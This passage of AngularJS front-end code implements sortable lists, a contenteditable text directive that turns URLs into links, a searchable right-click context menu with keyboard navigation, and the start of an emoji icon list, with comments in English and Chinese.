              value = patchSortableOption(key, value);

              if (!optsDiff) {
                optsDiff = {};
              }
              optsDiff[key] = value;
              opts[key] = value;
            });

            return optsDiff;
          }

          function getPlaceholderElement (element) {
            var placeholder = element.sortable('option','placeholder');

            // placeholder.element will be a function if the placeholder, has
            // been created (placeholder will be an object).  If it hasn't
            // been created, either placeholder will be false if no
            // placeholder class was given or placeholder.element will be
            // undefined if a class was given (placeholder will be a string)
            if (placeholder && placeholder.element && typeof placeholder.element === 'function') {
              var result = placeholder.element();
              // workaround for jquery ui 1.9.x,
              // not returning jquery collection
              result = angular.element(result);
              return result;
            }
            return null;
          }

          function getPlaceholderExcludesludes (element, placeholder) {
            // exact match with the placeholder's class attribute to handle
            // the case that multiple connected sortables exist and
            // the placeholder option equals the class of sortable items
            var notCssSelector = opts['ui-model-items'].replace(/[^,]*>/g, '');
            var excludes = element.find('[class="' + placeholder.attr('class') + '"]:not(' + notCssSelector + ')');
            return excludes;
          }

          function hasSortingHelper (element, ui) {
            var helperOption = element.sortable('option','helper');
            return helperOption === 'clone' || (typeof helperOption === 'function' && ui.item.sortable.isCustomHelperUsed());
          }

          function getSortingHelper (element, ui, savedNodes) {
            var result = null;
            if (hasSortingHelper(element, ui) &&
                element.sortable( 'option', 'appendTo' ) === 'parent') {
              // The .ui-sortable-helper element (that's the default class name)
              // is placed last.
              result = savedNodes.last();
            }
            return result;
          }

          // thanks jquery-ui
          function isFloating (item) {
            return (/left|right/).test(item.css('float')) || (/inline|table-cell/).test(item.css('display'));
          }

          function getElementScope(elementScopes, element) {
            var result = null;
            for (var i = 0; i < elementScopes.length; i++) {
              var x = elementScopes[i];
              if (x.element[0] === element[0]) {
                result = x.scope;
                break;
              }
            }
            return result;
          }

          function afterStop(e, ui) {
            ui.item.sortable._destroy();
          }

          // return the index of ui.item among the items
          // we can't just do ui.item.index() because there it might have siblings
          // which are not items
          function getItemIndex(item) {
            return item.parent()
              .find(opts['ui-model-items'])
              .index(item);
          }

          var opts = {};

          // directive specific options
          var directiveOpts = {
            'ui-floating': undefined,
            'ui-model-items': uiSortableConfig.items
          };

          var callbacks = {
            receive: null,
            remove: null,
            start: null,
            stop: null,
            update: null
          };

          var wrappers = {
            helper: null
          };

          angular.extend(opts, directiveOpts, uiSortableConfig, scope.uiSortable);

          if (!angular.element.fn || !angular.element.fn.jquery) {
            $log.error('ui.sortable: jQuery should be included before AngularJS!');
            return;
          }

          function wireUp () {
            // When we add or remove elements, we need the sortable to 'refresh'
            // so it can find the new/removed elements.
            scope.$watchCollection('ngModel', function() {
              // Timeout to let ng-repeat modify the DOM
              $timeout(function() {
                // ensure that the jquery-ui-sortable widget instance
                // is still bound to the directive's element
                if (!!getSortableWidgetInstance(element)) {
                  element.sortable('refresh');
                }
              }, 0, false);
            });

            callbacks.start = function(e, ui) {
              if (opts['ui-floating'] === 'auto') {
                // since the drag has started, the element will be
                // absolutely positioned, so we check its siblings
                var siblings = ui.item.siblings();
                var sortableWidgetInstance = getSortableWidgetInstance(angular.element(e.target));
                sortableWidgetInstance.floating = isFloating(siblings);
              }

              // Save the starting position of dragged item
              var index = getItemIndex(ui.item);
              ui.item.sortable = {
                model: ngModel.$modelValue[index],
                index: index,
                source: ui.item.parent(),
                sourceModel: ngModel.$modelValue,
                cancel: function () {
                  ui.item.sortable._isCanceled = true;
                },
                isCanceled: function () {
                  return ui.item.sortable._isCanceled;
                },
                isCustomHelperUsed: function () {
                  return !!ui.item.sortable._isCustomHelperUsed;
                },
                _isCanceled: false,
                _isCustomHelperUsed: ui.item.sortable._isCustomHelperUsed,
                _destroy: function () {
                  angular.forEach(ui.item.sortable, function(value, key) {
                    ui.item.sortable[key] = undefined;
                  });
                }
              };
            };

            callbacks.activate = function(e, ui) {
              // We need to make a copy of the current element's contents so
              // we can restore it after sortable has messed it up.
              // This is inside activate (instead of start) in order to save
              // both lists when dragging between connected lists.
              savedNodes = element.contents();

              // If this list has a placeholder (the connected lists won't),
              // don't inlcude it in saved nodes.
              var placeholder = getPlaceholderElement(element);
              if (placeholder && placeholder.length) {
                var excludes = getPlaceholderExcludesludes(element, placeholder);
                savedNodes = savedNodes.not(excludes);
              }

              // save the directive's scope so that it is accessible from ui.item.sortable
              var connectedSortables = ui.item.sortable._connectedSortables || [];

              connectedSortables.push({
                element: element,
                scope: scope
              });

              ui.item.sortable._connectedSortables = connectedSortables;
            };

            callbacks.update = function(e, ui) {
              // Save current drop position but only if this is not a second
              // update that happens when moving between lists because then
              // the value will be overwritten with the old value
              if(!ui.item.sortable.received) {
                ui.item.sortable.dropindex = getItemIndex(ui.item);
                var droptarget = ui.item.parent();
                ui.item.sortable.droptarget = droptarget;

                var droptargetScope = getElementScope(ui.item.sortable._connectedSortables, droptarget);
                ui.item.sortable.droptargetModel = droptargetScope.ngModel;

                // Cancel the sort (let ng-repeat do the sort for us)
                // Don't cancel if this is the received list because it has
                // already been canceled in the other list, and trying to cancel
                // here will mess up the DOM.
                element.sortable('cancel');
              }

              // Put the nodes back exactly the way they started (this is very
              // important because ng-repeat uses comment elements to delineate
              // the start and stop of repeat sections and sortable doesn't
              // respect their order (even if we cancel, the order of the
              // comments are still messed up).
              var sortingHelper = !ui.item.sortable.received && getSortingHelper(element, ui, savedNodes);
              if (sortingHelper && sortingHelper.length) {
                // Restore all the savedNodes except from the sorting helper element.
                // That way it will be garbage collected.
                savedNodes = savedNodes.not(sortingHelper);
              }
              savedNodes.appendTo(element);

              // If this is the target connected list then
              // it's safe to clear the restored nodes since:
              // update is currently running and
              // stop is not called for the target list.
              if(ui.item.sortable.received) {
                savedNodes = null;
              }

              // If received is true (an item was dropped in from another list)
              // then we add the new item to this list otherwise wait until the
              // stop event where we will know if it was a sort or item was
              // moved here from another list
              if(ui.item.sortable.received && !ui.item.sortable.isCanceled()) {
                scope.$apply(function () {
                  ngModel.$modelValue.splice(ui.item.sortable.dropindex, 0,
                                             ui.item.sortable.moved);
                });
              }
            };

            callbacks.stop = function(e, ui) {
              // If the received flag hasn't be set on the item, this is a
              // normal sort, if dropindex is set, the item was moved, so move
              // the items in the list.
              if(!ui.item.sortable.received &&
                 ('dropindex' in ui.item.sortable) &&
                 !ui.item.sortable.isCanceled()) {

                scope.$apply(function () {
                  ngModel.$modelValue.splice(
                    ui.item.sortable.dropindex, 0,
                    ngModel.$modelValue.splice(ui.item.sortable.index, 1)[0]);
                });
              } else {
                // if the item was not moved, then restore the elements
                // so that the ngRepeat's comment are correct.
                if ((!('dropindex' in ui.item.sortable) || ui.item.sortable.isCanceled()) &&
                    !angular.equals(element.contents(), savedNodes)) {

                  var sortingHelper = getSortingHelper(element, ui, savedNodes);
                  if (sortingHelper && sortingHelper.length) {
                    // Restore all the savedNodes except from the sorting helper element.
                    // That way it will be garbage collected.
                    savedNodes = savedNodes.not(sortingHelper);
                  }
                  savedNodes.appendTo(element);
                }
              }

              // It's now safe to clear the savedNodes
              // since stop is the last callback.
              savedNodes = null;
            };

            callbacks.receive = function(e, ui) {
              // An item was dropped here from another list, set a flag on the
              // item.
              ui.item.sortable.received = true;
            };

            callbacks.remove = function(e, ui) {
              // Workaround for a problem observed in nested connected lists.
              // There should be an 'update' event before 'remove' when moving
              // elements. If the event did not fire, cancel sorting.
              if (!('dropindex' in ui.item.sortable)) {
                element.sortable('cancel');
                ui.item.sortable.cancel();
              }

              // Remove the item from this list's model and copy data into item,
              // so the next list can retrive it
              if (!ui.item.sortable.isCanceled()) {
                scope.$apply(function () {
                  ui.item.sortable.moved = ngModel.$modelValue.splice(
                    ui.item.sortable.index, 1)[0];
                });
              }
            };

            wrappers.helper = function (inner) {
              if (inner && typeof inner === 'function') {
                return function (e, item) {
                  var oldItemSortable = item.sortable;
                  var index = getItemIndex(item);
                  item.sortable = {
                    model: ngModel.$modelValue[index],
                    index: index,
                    source: item.parent(),
                    sourceModel: ngModel.$modelValue,
                    _restore: function () {
                      angular.forEach(item.sortable, function(value, key) {
                        item.sortable[key] = undefined;
                      });

                      item.sortable = oldItemSortable;
                    }
                  };

                  var innerResult = inner.apply(this, arguments);
                  item.sortable._restore();
                  item.sortable._isCustomHelperUsed = item !== innerResult;
                  return innerResult;
                };
              }
              return inner;
            };

            scope.$watchCollection('uiSortable', function(newVal, oldVal) {
              // ensure that the jquery-ui-sortable widget instance
              // is still bound to the directive's element
              var sortableWidgetInstance = getSortableWidgetInstance(element);
              if (!!sortableWidgetInstance) {
                var optsDiff = patchUISortableOptions(newVal, oldVal, sortableWidgetInstance);
                
                if (optsDiff) {
                  element.sortable('option', optsDiff);
                }
              }
            }, true);

            patchUISortableOptions(opts);
          }

          function init () {
            if (ngModel) {
              wireUp();
            } else {
              $log.info('ui.sortable: ngModel not provided!', element);
            }
            
            // Create sortable
            element.sortable(opts);
          }

          function initIfEnabled () {
            if (scope.uiSortable && scope.uiSortable.disabled) {
              return false;
            }

            init();

            // Stop Watcher
            initIfEnabled.cancelWatcher();
            initIfEnabled.cancelWatcher = angular.noop;

            return true;
          }

          initIfEnabled.cancelWatcher = angular.noop;

          if (!initIfEnabled()) {
            initIfEnabled.cancelWatcher = scope.$watch('uiSortable.disabled', initIfEnabled);
          }
        }
      };
    }
  ]);

/**
 * @see http://docs.angularjs.org/guide/concepts
 * @see http://docs.angularjs.org/api/ng.directive:ngModel.NgModelController
 * @see https://github.com/angular/angular.js/issues/528#issuecomment-7573166
 */

angular.module('contenteditable', [])
    .directive('contenteditable', ['$timeout', function($timeout) {
        return {
            restrict: 'A',
            require: '?ngModel',
            link: function(scope, element, attrs, ngModel) {

                function linkify(inputText) {
                    var replacedText, replacePattern1, replacePattern2, replacePattern3;

                    //URLs starting with http://, https://, or ftp://
                    replacePattern1 = /(\b(https?|ftp):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/gim;
                    replacedText = inputText.replace(replacePattern1, '<a href="$1" target="_blank">$1</a>');

                    //URLs starting with "www." (without // before it, or it'd re-link the ones done above).
                    replacePattern2 = /(^|[^\/])(www\.[\S]+(\b|$))/gim;
                    replacedText = replacedText.replace(replacePattern2, '$1<a href="http://$2" target="_blank">$2</a>');

                    //Change email addresses to mailto:: links.
                    replacePattern3 = /(([a-zA-Z0-9\-\_\.])+@[a-zA-Z\_]+?(\.[a-zA-Z]{2,6})+)/gim;
                    replacedText = replacedText.replace(replacePattern3, '<a href="mailto:$1">$1</a>');

                    return replacedText;
                }

                scope.$on('$destroy', function () {
                    element.find("a").off("click");
                });

                // don't do anything unless this is actually bound to a model
                if (!ngModel) {
                    return
                }

                // ngModel.$$setOptions({debounce: 1000, updateOnDefault: true});.

                // ngModel.$$setOptions({
                //     updateOn: 'blur',
                //     updateOnDefault: true,
                //     debounce: {
                //         'blur': 2000,
                //         'default': 3000
                //     }
                // });

                // options
                var opts = {}
                angular.forEach([
                    'stripBr',
                    'noLineBreaks',
                    'selectNonEditable',
                    'moveCaretToEndOnChange',
                    'stripTags',
                    'allowLink'
                ], function(opt) {
                    var o = attrs[opt]
                    opts[opt] = o && o !== 'false'
                })

                element.on('keydown', function(e) {
                    if (e.keyCode === 27) {
                        e.stopPropagation();
                        e.preventDefault();
                    }
                });

                // view -> model
                element.on('blur', function(e) {
                    // scope.$apply(function() {
                        var html, html2, rerender, originalHTML;
                        html = element.html();
                        originalHTML = html;
                        rerender = false
                        if (opts.stripBr) {
                            html = html.replace(/<br>$/, '')
                        }
                        if (opts.noLineBreaks) {
                            html2 = html.replace(/<div>/g, '').replace(/<br>/g, '').replace(/<\/div>/g, '').replace(/(\r\n|\n|\r)/g, '')
                            if (html2 !== html) {
                                rerender = true
                                html = html2
                            }
                        }
                        if (html && html.replaceAll) {
                            html = html.replaceAll("&amp;", "&");
                        }
                        ngModel.$setViewValue(html);
                        if (originalHTML !== html) {
                            if (rerender) {
                                ngModel.$render()
                            }
                            else if (html.length !== linkify(html)) {
                                ngModel.$render();
                            }
                        }
                        // if (html === '') {
                            // the cursor disappears if the contents is empty
                            // so we need to refocus
                            // $timeout(function() {
                                // element[0].blur()
                                // element[0].focus()
                            // })
                        // }
                    // })
                });

                // element.on('input', function(e) {
                //     var html, html2, rerender
                //     html = element.html()
                //     rerender = false
                //     if (opts.stripBr) {
                //         html = html.replace(/<br>$/, '')
                //     }
                //     if (opts.noLineBreaks) {
                //         html2 = html.replace(/<div>/g, '').replace(/<br>/g, '').replace(/<\/div>/g, '')
                //         if (html2 !== html) {
                //             rerender = true
                //             html = html2
                //         }
                //     }
                //     html = html.replaceAll("&amp;", "&");
                //     ngModel.$setViewValue(html);
                // });

                // model -> view
                var oldRender = ngModel.$render
                ngModel.$render = function() {
                    var el, el2, range, sel
                    if (!!oldRender) {
                        oldRender()
                    }
                    var html = ngModel.$viewValue || ''

                    if (new RegExp(/<\/?[b-z\d][^>]*>/ig).test(html)) {
                        element.text(html);
                    }
                    else {
                        html = html.replace(/<\S[^><]*>/g, '')

                        if (opts.allowLink) {
                            html = linkify(html);
                            element.html(html);
                        }
                        else {
                            element.text(html);
                        }
                    }
                    
                    // NOTE: 不需要再次绑定，因为已經有全域的绑定了
                    // element.find("a").on("click", function () {
                    //     var link = this.href;
                    //     if (link) {
                    //         shell.openExternal(link);
                    //     }
                    // });

                    // NOTE: 这里不能使用 html()，这样会导致一些 < 开头的文字被当成 HTML Tag 最终无法显示在画面上
                    // 例如 <p 无法显示
                    // element.text(html);
                    // element.html(html);

                    if (opts.moveCaretToEndOnChange) {
                        el = element[0]
                        range = document.createRange()
                        sel = window.getSelection()
                        if (el.childNodes.length > 0) {
                            el2 = el.childNodes[el.childNodes.length - 1]
                            range.setStartAfter(el2)
                        } else {
                            range.setStartAfter(el)
                        }
                        range.collapse(true)
                        sel.removeAllRanges()
                        sel.addRange(range)
                    }
                }
                if (opts.selectNonEditable) {
                    element.bind('click', function(e) {
                        var range, sel, target
                        target = e.toElement
                        if (target !== this && angular.element(target).attr('contenteditable') === 'false') {
                            range = document.createRange()
                            sel = window.getSelection()
                            range.setStartBefore(target)
                            range.setEndAfter(target)
                            sel.removeAllRanges()
                            sel.addRange(range)
                        }
                    })
                }
            }
        }
    }]);

class ContextMenu {
    static open(options) {
        const $rootScope = angular.element("html").scope();
        $rootScope.$broadcast('CONTEXTMENU.OPEN', options);
    }
    static close() {
        const $rootScope = angular.element("html").scope();
        $rootScope.$broadcast('CONTEXTMENU.CLOSE');
    }
}

angular.module('contextMenu', [])
.directive('contextMenuItems', ($timeout) => {
    return {
        restrict: 'E',
        templateUrl: 'js/modules/context-menu/context-menu-items.html',
        scope: {
            menu: '=',
            activeMenu: '=',
            searchKeyword: '=',
            theme: '=theme'
        },
        replace: false,
        link: (scope, element, attrs) => {
            scope.toggleItem = scope.$parent.toggleItem;
            scope.openItem = scope.$parent.openItem;
            scope.openMore = scope.$parent.openMore;
            scope.hoverItem = scope.$parent.hoverItem;
            scope.sortableOptions = scope.$parent.sortableOptions;
        }
    }
})

// 設計邏輯
// 1. 按下右鍵時，會觸發 contextmenu 事件，並且傳入 options 物件
// 2. options 物件裡面包含了 menu 物件，menu 物件裡面包含了 items 屬性，items 屬性是一個陣列，裡面包含了每個選單項目的資料
// 3. 每個選單項目的資料裡面，包含了 label, click, role, submenu, disabled, keepOpen, checked, visible, keywords 等屬性
// 4. 每個選單項目的資料裡面，如果有 submenu 屬性，則 submenu 屬性裡面也包含了 items 屬性，items 屬性是一個陣列，裡面包含了每個選單項目的資料
// 5. input 會監聽 keydown 事件，並且傳入 event 物件，而事件控制的選單，是 scope.activeMenu
.directive('contextMenu', ($timeout) => {
    return {
        restrict: 'E',
        templateUrl: 'js/modules/context-menu/context-menu.html',
        replace: false,
        scope: {
            theme: '=theme'
        },
        link: (scope, element, attrs) => {

            let onOpened;
            let onClosed;
            let onSorted;
            let originalMenu;
            let keyBuffer = "";
            let keyBufferTimeout = null;

            scope.sortableOptions = {
                distance: 10,
                animation: 200,
                disabled: false,
                helper : 'clone',
                update: (e, ui) => {
                    setTimeout(() => {
                        onSorted && onSorted(originalMenu.items);
                    }, 1);
                },
            };

            const $contextMenuElement = element.find("> .context-menu");
            const $searchInputElement = element.find("input[type='search']");

            // 如果 context menu 沒有開啟，不應該被 focus
            $searchInputElement.on("focus", () => {
                if (!$contextMenuElement.hasClass("open")) {
                    blurSearchInput();
                }
            });

            const selectUp = () => {
                if (scope.activeMenu.currentIndex > 0) {
                    let prevIdx = scope.activeMenu.currentIndex - 1;
                    let prevItem = scope.activeMenu.items[prevIdx];
                    if (!prevItem) return;
                    scope.activeMenu.currentIndex = prevIdx;
                    if (!isItemSelectable(prevItem)) {
                        selectUp();
                    }
                }
            };
            
            const selectDown = () => {
                if (scope.activeMenu.currentIndex < scope.activeMenu.items.length - 1) {
                    let nextIdx = scope.activeMenu.currentIndex + 1;
                    let nextItem = scope.activeMenu.items[nextIdx];
                    if (!nextItem) return;
                    scope.activeMenu.currentIndex = nextIdx;
                    if (!isItemSelectable(nextItem)) {
                        selectDown();
                    }
                }
            };

            const openSubmenu = (item) => {
                if (!item?.submenu) return;
                scope.activeMenu = item.submenu;
                scope.activeMenu.currentIndex = 0;
            };

            const closeSubmenu = () => {
                scope.activeMenu = originalMenu;
            };

            const isItemSelectable = (item) => {
                if (item.role === 'toggle') return true;
                return !item.role && !item.disabled;
            };

            const hoverItem = (index, menu) => {
                menu.currentIndex = index;
                scope.activeMenu = menu;
                let item = menu.items[index];
                openSubmenu(item);
            };

            const openItem = (item) => {
                if (!item || item?.submenu) return;
                item?.click && item.click(item);
                if (item?.keepOpen) {
                    // check item has checked property
                    if (item.checked !== undefined) {
                        item.checked = !item.checked;
                    }
                }
                else {
                    scope.close();
                }
            };

            const toggleItem = (item) => {
                item.pinned = !item.pinned;
                item?.toggle && item.toggle(item.pinned);
            };

            const openMore = (item) => {
                item?.more && item.more(item);
            };

            const moveToCursorPosition = (callback, retry) => {
                const windowWidth = $(window).width();
                const windowHeight = $(window).height();
                const containerWidth = $contextMenuElement.width();
                const containerHeight = $contextMenuElement.height();
                let searchInputHeight = (scope.displayMenu.showSearch ? 36 : 0);

                // NOTE: 避免尚未完成渲染的時候，取得的 containerHeight 為 0
                if (retry < 5 && (containerHeight < 34 + searchInputHeight || containerWidth < 90)) {
                    setTimeout(() => {
                        moveToCursorPosition(callback, retry + 1);
                    }, 50);
                    return;
                }

                let x = windowMouseX + 10; 
                let y = windowMouseY - 10;

                if (windowMouseX + containerWidth > windowWidth) {
                    x = windowMouseX - containerWidth - 5;
                }

                if (windowMouseY + containerHeight > windowHeight - 20) {
                    y = windowHeight - containerHeight - 20;
                    y = y < 20 ? 20 : y;
                }
                else if (windowMouseY - 56 < 0) {
                    y = 36;
                }

                $contextMenuElement.css({
                    left: `${x}px`,
                    top: `${y}px`,
                });

                let maxHeight = windowHeight - searchInputHeight - y - 20;
                
                $contextMenuElement.find(".context-menu-items").css({
                    maxHeight: `${maxHeight}px`
                });
                
                callback();
            };

            const openContextMenu = (options) => {
                $timeout(() => {
                    moveToCursorPosition(() => {
                        $contextMenuElement.addClass("open");
                        onOpened();
                        setTimeout(focusSearchInput, 50);
                    }, 0);
                }, 50);
            };

            const closeContextMenu = () => {
                destroy();
                $contextMenuElement.removeClass("open");
                blurSearchInput();
                onClosed();
            };

            const focusSearchInput = () => {
                $searchInputElement.focus();
            };

            const blurSearchInput = () => {
                $searchInputElement.blur();
            };

            let enterKeydown = false;
            const onSearchKeydown = (event) => {
                const idx = scope?.activeMenu?.currentIndex;
                const item = (scope?.activeMenu?.items) ? scope.activeMenu.items[idx] : null;
                switch (event.keyCode) {
                    case 13: // enter
                        event.preventDefault();
                        enterKeydown = true;
                        break;
                    case 38: // up
                        event.preventDefault();
                        selectUp();
                        break;
                    case 40: // down
                        event.preventDefault();
                        selectDown();
                        break;
                    case 37: // left
                        closeSubmenu(item);
                        break;
                    case 39: // right
                        openSubmenu(item);
                        break;
                    case 27: // esc
                        event.preventDefault();
                        break;
                    default:
                        if (!scope.displayMenu.showSearch) {
                            event.stopPropagation();
                            event.preventDefault();
                            // 自動搜尋字母開頭等於 item.label 的項目
                            keyBuffer += String.fromCharCode(event.keyCode).toLowerCase();
                            clearTimeout(keyBufferTimeout);
                            keyBufferTimeout = setTimeout(() => {
                                keyBuffer = "";
                            }, 500);
                            let idx = scope.activeMenu.items.findIndex(item => item?.label?.toLowerCase().startsWith(keyBuffer));
                            if (idx >= 0) {
                                scope.activeMenu.currentIndex = idx;
                            }
                            
                        }
                        break;
                }
            };

            const onSearchKeyup = (event) => {
                const item = scope?.activeMenu?.items[scope.activeMenu.currentIndex];
                switch (event.keyCode) {
                    // 沒有搜尋功能的右鍵選單，按下空白鍵時，會直接開啟選單項目
                    case 32:
                        if (!scope.displayMenu.showSearch) {;
                            event.preventDefault();
                            openItem(item);
                        }
                        break;
                    case 13: // enter
                        if (enterKeydown) {
                            openItem(item);
                            enterKeydown = false;
                        }
                        break;
                    case 27: // esc
                        event.preventDefault();
                        closeContextMenu();
                        break;
                }
            };

            const init = (menu) => {
                // 清理 menu.items 裡面不需要的 item
                menu.items = menu.items.filter(item => {
                    return item.visible !== false;
                });
                eagle.utils.tree.walk(menu, 'items', function(item, parent) {
                    if (item.submenu) {
                        item.submenu.items = item.submenu.items.filter(item => {
                            return item.visible !== false;
                        });
                    }
                });
                originalMenu = menu;
                scope.sortableOptions = {
                    distance: 10,
                    animation: 200,
                    handle: (menu.sortableHelper)? '.drag-helper' : undefined,
                    disabled: false,
                    helper : 'clone',
                    update: (e, ui) => {
                        setTimeout(() => {
                            onSorted && onSorted(originalMenu.items);
                        }, 1);
                    },
                };
                scope.width = menu.width || 'auto';
                scope.displayMenu = menu;
                scope.displayMenu.currentIndex = -1;
                scope.activeMenu = menu;
                onOpened = menu.onOpened || (() => {});
                onClosed = menu.onClosed || (() => {});
                onSorted = menu.onSorted || (() => {});
            };

            const destroy = () => {
                $contextMenuElement.find(".context-menu-items").css("max-height", "");
                scope.searchKeyword = "";
                scope.displayMenu = {};
                scope.activeMenu = null;
            };

            const onSearchChange = () => {
                if (!scope.displayMenu.showSearch) return;
                if (scope.searchKeyword !== "") {
                    // 建立一個新的 menu 物件，及進入搜尋狀態
                    scope.displayMenu = getSearchResultMenu();
                    scope.sortableOptions.disabled = true;
                }
                else {
                    scope.displayMenu = originalMenu;
                    scope.displayMenu.currentIndex = -1;
                    scope.sortableOptions.disabled = false;
                }
                scope.activeMenu = scope.displayMenu;
            };

            const getSearchResultMenu = () => {

                const filterItems = (items, keyword) => {

                    if (!items) return;
                    if (!keyword) return items;
                    let keyword_cn = chineseConvert.tw2cn(keyword);
    
                    let temp = items.map(item => {
                        const itemName = `${item.label ?? ''} ${item.keywords ?? ''}`;
                        let nameCN = chineseConvert.tw2cn(itemName);
                        return {
                            item: item,
                            name: nameCN,
                            search: [nameCN]
                        }
                    });
    
                    let scores = temp.map(item => {
                        const itemName = `${item.label ?? ''} ${item.keywords ?? ''}`;
                        return {
                            item: item,
                            name: itemName,
                            score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
                        };
                    });

                    let result = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
                        return i.item.item;
                    });

                    // 排除具有 submenu 属性的 item
                    // result = result.filter((item) => {
                    //     return item.role !== 'separator' && item.role !== 'label';
                    // });
                    result = result.filter(item => !item.role || item.role === 'toggle');
                    result = result.filter(item => !item.submenu);
                    result = result.filter(item => !item.disabled);

                    // sort by keyword start index small to large
                    // if any item is -1 ignore sort
                    result = result.sort((a, b) => {
                        let aIndex = a.label.toLowerCase().indexOf(keyword.toLowerCase());
                        let bIndex = b.label.toLowerCase().indexOf(keyword.toLowerCase());
                        if (aIndex === -1 || bIndex === -1) return 0;
                        return aIndex - bIndex;
                    });
                    
                    return result;
                };

                let result = {
                    items: [],
                    showSearch: true,
                    currentIndex: 0,
                };

                // 先搜尋第一層
                let level1Result = filterItems(originalMenu.items, scope.searchKeyword);
                // 根據關鍵字出現的位置排序, 如果任何index =-1 則忽略排序
                level1Result.sort((a, b) => {
                    let aIndex = a.label.toLowerCase().indexOf(scope.searchKeyword.toLowerCase());
                    let bIndex = b.label.toLowerCase().indexOf(scope.searchKeyword.toLowerCase());
                    if (aIndex === -1 || bIndex === -1) return 0;
                    return aIndex - bIndex;
                });

                result.items = [...level1Result];

                // 尋找第一層結果中，首個名稱開頭與關鍵字相同的項目
                const level1MatchStartIndex = level1Result.findIndex(item => item.label.toLowerCase().startsWith(scope.searchKeyword.toLowerCase())) ?? -1;

                // 再搜尋第二層
                const level2Results = [];
                originalMenu.items.forEach((item) => {
                    if (item?.submenu?.items) {
                        let level2Result = filterItems(item.submenu.items, scope.searchKeyword);
                        if (level2Result.length > 0) {
                            // 找出項目中，keyword index 最靠前的 index，這個 index 是 label.indexOf(keyword) 的值
                            let level2KeywordIndex = -1;
                            level2Result.forEach((level2Item) => {
                                const keywordIndex = level2Item.label.toLowerCase().indexOf(scope.searchKeyword.toLowerCase());
                                if (keywordIndex > level2KeywordIndex) {
                                    level2KeywordIndex = keywordIndex;
                                }
                            });

                            level2Results.push({
                                parent: item,
                                index: level2KeywordIndex,
                                items: level2Result
                            });
                        }
                    }
                });

                // sort level2Results by index, if any index is -1 ignore sort
                level2Results.sort((a, b) => {
                    if (a.index === -1 || b.index === -1) return 0;
                    return a.index - b.index;
                });

                // 將 level2Results 放在 level1Result 之後
                level2Results.forEach((level2Result) => {
                    let parent = level2Result.parent;
                    let level2Items = level2Result.items;
                    let level2Index = level2Result.index;
                    // level1MatchStartIndex === -1 且如果 level2Result 首個項目的關鍵字開頭剛好與 keyword 相同，則將 level2Result 放在 level1Result 前面
                    if (level1MatchStartIndex === -1 && level2Index >= 0) {
                        if (result.items.length > 0) {
                            level2Items = [{ role: 'label', label:parent.label }, ...level2Items, { role: 'separator' }];
                        }
                        else {
                            level2Items = [{ role: 'label', label:parent.label }, ...level2Items];
                        }
                        result.items = [...level2Items, ...result.items];
                    }
                    else {
                        if (result.items.length > 0) {
                            level2Items = [{ role: 'separator' }, { role: 'label', label:parent.label }, ...level2Items];
                        }
                        else {
                            level2Items = [{ role: 'label', label:parent.label }, ...level2Items];
                        }
                        result.items = [...result.items, ...level2Items];
                    }
                });

                result.currentIndex = result.items.findIndex(item => isItemSelectable(item)) || 0;
                return result;
            };

            scope.$on('CONTEXTMENU.OPEN', (event, options) => {
                init(options);
                openContextMenu();
            });

            scope.$on('CONTEXTMENU.CLOSE', (event) => {
                closeContextMenu();
            });
            
            Object.assign(scope, {
                searchKeyword: "",
                menu: null,
                activeMenu: null,
                focusSearchInput: focusSearchInput,
                onSearchKeydown: onSearchKeydown,
                onSearchKeyup: onSearchKeyup,
                onSearchChange: onSearchChange,
                openItem: openItem,
                openMore: openMore,
                toggleItem: toggleItem,
                hoverItem: hoverItem,
                close: closeContextMenu
            });
        }
    }
})
// 自動定位 context menu 的位置
.directive('autoPositionContextMenu', ($timeout) => {
    return {
        restrict: 'A',
        link: (scope, element) => {
            const autoPositionContextMenu = () => {
                
                const $menuItem = $("#submenu-placeholder").parent();
                if (!$menuItem.length) return;

                const { top: menuItemTop, left: menuItemLeft } = $menuItem.position();
                const { top: menuItemOffsetTop, left: menuItemOffsetLeft } = $menuItem.offset();
                
                const elementTop = menuItemOffsetTop;
                const elementBottom = elementTop + element.height();
                const elementRight = menuItemOffsetLeft + $menuItem.outerWidth() + element.outerWidth();
                const maxBottom = $(window).height() - 20;
                const maxRight = $(window).width() - 20;

                let offsetY = 0;
                let offsetX = 0;

                if (elementBottom > maxBottom) offsetY = elementBottom - maxBottom;
                if (elementRight > maxRight) offsetX = $menuItem.outerWidth() + element.outerWidth();

                offsetY = Math.min(offsetY, elementTop);

                const top = menuItemTop - offsetY;
                const left = Math.max(-menuItemOffsetLeft + 20, menuItemLeft + $menuItem.outerWidth() - offsetX - 4);

                element.css({
                    opacity: 1,
                    top: `${top}px`,
                    left: `${left}px`,
                });

                element.find(".context-menu-items").css({
                    maxHeight: `${maxBottom - offsetY}px`
                });
            };
            $timeout(autoPositionContextMenu, 50);
            $(window).off('resize.submenu').on('resize.submenu', autoPositionContextMenu);
        }
    }
})


angular.module('contextMenu').directive('contextMenuEmojiItems', ($timeout) => {
    return {
        restrict: 'E',
        templateUrl: 'js/modules/context-menu/context-menu-emoji-items.html',
        replace: true,
        link: (scope, element, attrs) => {
            scope.emojiGroups = [
            [
                // 集合、多媒体、工具
                { type: 'icon' },
                { type: 'icon', icon: 'library' },
                { type: 'icon', icon: 'box' },
                { type: 'icon', icon: 'grid' },
                { type: 'icon', icon: 'layer' },
                { type: 'icon', icon: 'briefcase' },
                { type: 'icon', icon: 'photo' },
                { type: 'icon', icon: 'photos' },
                { type: 'icon', icon: 'video' },
                { type: 'icon', icon: 'film' },
                { type: 'icon', icon: 'film2' },
                { type: 'icon', icon: 'film3' },
                { type: 'icon', icon: 'music' },
                { type: 'icon', icon: 'book' },
                { type: 'icon', icon: 'book2' },
                { type: 'icon', icon: 'bookshelf' },
                { type: 'icon', icon: 'keynote' },
                { type: 'icon', icon: 'camera' },
                { type: 'icon', icon: 'aperture' },
                { type: 'icon', icon: 'attachment' },
                { type: 'icon', icon: 'scissors' },
                { type: 'icon', icon: 'palette' },
                { type: 'icon', icon: 'wrench' },
                { type: 'icon', icon: 'helmet' },
                { type: 'icon', icon: 'life-buoy' },
                { type: 'icon', icon: 'graph' },
                { type: 'icon', icon: 'graph2' },
                { type: 'icon', icon: 'tableware' },
                { type: 'icon', icon: 'cog' },
                { type: 'icon', icon: 'bachelor-cap' },
                { type: 'icon', icon: 'cones' },
                { type: 'icon', icon: 'dribbble' },
                { type: 'icon', icon: 'email' },
